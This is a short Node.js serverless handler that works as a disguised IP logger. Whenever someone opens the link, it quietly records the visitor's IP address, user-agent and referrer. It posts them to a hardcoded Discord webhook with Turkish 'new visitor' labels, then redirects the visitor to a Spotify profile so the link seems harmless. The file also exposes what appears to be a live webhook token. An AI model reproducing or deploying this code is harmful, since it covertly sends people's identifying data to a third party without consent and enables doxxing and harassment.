const https = require('https');

const WEBHOOK = 'https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO';
const REDIRECT = 'https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a';

module.exports = (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || 'Bilinmiyor';
  const referrer = req.headers['referer'] || '';
  const msg = '**Yeni Ziyaretçi!**\n**IP:** ' + ip + '\n**User-Agent:** ' + ua + '\n**Sayfa:** ' + (referrer || 'Doğrudan') + '\n**Zaman:** ' + new Date().toLocaleString('tr-TR');
  const data = JSON.stringify({content: msg});
  const url = new URL(WEBHOOK);
  const opts = { hostname: url.hostname, path: url.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } };
  const req2 = https.request(opts);
  req2.write(data);
  req2.end();
  res.writeHead(302, { Location: REDIRECT });
  res.end();
};
